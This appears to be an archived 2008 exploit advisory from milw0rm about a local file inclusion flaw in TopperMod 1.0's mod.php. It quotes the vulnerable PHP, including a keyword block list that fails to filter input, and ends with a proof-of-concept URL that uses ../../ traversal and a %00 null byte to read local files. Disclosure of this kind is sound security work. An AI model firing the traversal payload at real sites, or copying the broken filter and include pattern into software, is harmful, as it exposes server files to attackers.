<html><head><title>TopperMod 1.0 (mod.php) Local File Inclusion Vulnerability</title></head><pre># Author:	__GiReX__
# mySite:	girex.altervista.org

# CMS: 		TopperMod v1.0
# Site:		rtcw.ch/mio/index.php

# Bug: 		Local File Inclusion
# File: 	mod.php
# Var :		$to


# Bug explanation - Vuln Code:

	if (isset($_GET['mod'])) { $mod = stripslashes($_GET['mod']); } else { header(&quot;location index.php&quot;); Die(); }
	if (isset($_GET['to'])) { $to = stripslashes($_GET['to']); } else { $to=&quot;index&quot;; }

# Our bugged vars are GET's var so we don't need Register_Globals turned On
 
 
	$vietate=array(&quot;http&quot;,&quot;select&quot;,&quot;union&quot;,&quot;where&quot;,&quot;delete&quot;,&quot;insert&quot;,&quot;alert&quot;,&quot;document&quot;);
		if (ereg($vietate,strtolower($mod)) OR ereg($vietate,strtolower($to)) ) { 
	 		echo &quot;&lt;META HTTP-EQUIV=\&quot;refresh\&quot; content=\&quot;1;URL=index.php\&quot;&gt;&quot;;
		} elseif (ereg(&quot;[a-zA-Z0-9]&quot;,$mod) OR ereg(&quot;[a-zA-Z0-9]&quot;,$to)) {

# Our exploitation don't use a $vietate word and
# the check of ereg() return true if we use some letters


  ...
# ... we must be logged in and $mod must be a real section
  ...


	if (file_exists(&quot;mod/$mod/&quot;.$to.&quot;.php&quot;) ) {
		include(&quot;mod/$mod/&quot;.$to.&quot;.php&quot;);
	} else {
		echo &quot;&lt;META HTTP-EQUIV=\&quot;refresh\&quot; content=\&quot;1;URL=index.php\&quot;&gt;&quot;;
				}

# var $to is not sanizated so we can exploit thought Local File Inclusion


PoC:  [host]/[path]/mod.php?mod=account&amp;to=../../[local file]%00

# milw0rm.com [2008-03-25]</pre></html>